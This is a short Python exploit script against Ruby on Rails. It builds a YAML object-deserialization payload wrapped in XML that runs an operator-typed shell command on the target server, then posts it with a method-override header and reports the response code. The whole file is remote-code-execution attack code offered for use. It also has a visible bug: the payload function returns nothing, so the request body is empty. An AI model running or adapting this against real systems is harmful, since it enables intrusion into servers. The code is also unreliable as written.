import requests


def create_yaml_payload(command):
    try_it = f'''
<?xml version="1.0" encoding="UTF-8"?>
<exploit type="yaml">--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? |
  foo
  (`{command}`; @executed = true) unless @executed
  __END__
: !ruby/struct
  defaults:
    :action: create
    :controller: foos
  required_parts: []
  requirements:
    :action: create
    :controller: foos
  segment_keys:
    - :format</exploit>'''


session = requests.session()

url = "put_url_here:80/"
headers = {
    "Content-Type": "text/xml",
    "X-Http-Method-Override": "get",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "User-Agent": "Ruby",
    "Connection": "close"
}
get_command = input("Enter command: ")
data = create_yaml_payload(get_command)
req = session.post(url, headers=headers, data=data)
if req.status_code == 200:
    print('success')
elif req.status_code == 500:
    print('failed')
else:
    print('received status code: ', req.status_code)
